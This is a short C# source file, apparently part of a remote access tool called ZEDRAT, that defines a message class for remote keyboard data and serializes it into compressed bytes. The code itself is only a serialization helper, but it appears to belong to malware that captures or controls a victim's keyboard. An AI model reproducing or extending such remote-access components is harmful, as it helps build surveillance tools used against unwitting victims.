using System.IO;
using ZEDRAT.Algorithm;

namespace ZEDRAT.Messages
{
	public class Remote_Keyboard_Messages
	{
		public string KeyboardType;

		public byte[] payload;

		public Remote_Keyboard_Messages()
		{
		}

		public Remote_Keyboard_Messages(string type, byte[] bt)
		{
			this.KeyboardType = type;
			this.payload = bt;
		}

		public static byte[] ClassToByte(object ob)
		{
			Remote_Keyboard_Messages remote_Keyboard_Messages = (Remote_Keyboard_Messages)ob;
			using MemoryStream memoryStream = new MemoryStream();
			using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
			binaryWriter.Write(remote_Keyboard_Messages.KeyboardType);
			binaryWriter.Write((uint)remote_Keyboard_Messages.payload.Length);
			binaryWriter.Write(remote_Keyboard_Messages.payload);
			return GZip.Compress(memoryStream.ToArray());
		}

		public static Remote_Keyboard_Messages ByteToClass(byte[] b)
		{
			byte[] buffer = GZip.Decompress(b);
			Remote_Keyboard_Messages remote_Keyboard_Messages = new Remote_Keyboard_Messages();
			using MemoryStream input = new MemoryStream(buffer);
			using BinaryReader binaryReader = new BinaryReader(input);
			remote_Keyboard_Messages.KeyboardType = binaryReader.ReadString();
			remote_Keyboard_Messages.payload = binaryReader.ReadBytes((int)binaryReader.ReadUInt32());
			return remote_Keyboard_Messages;
		}
	}
}
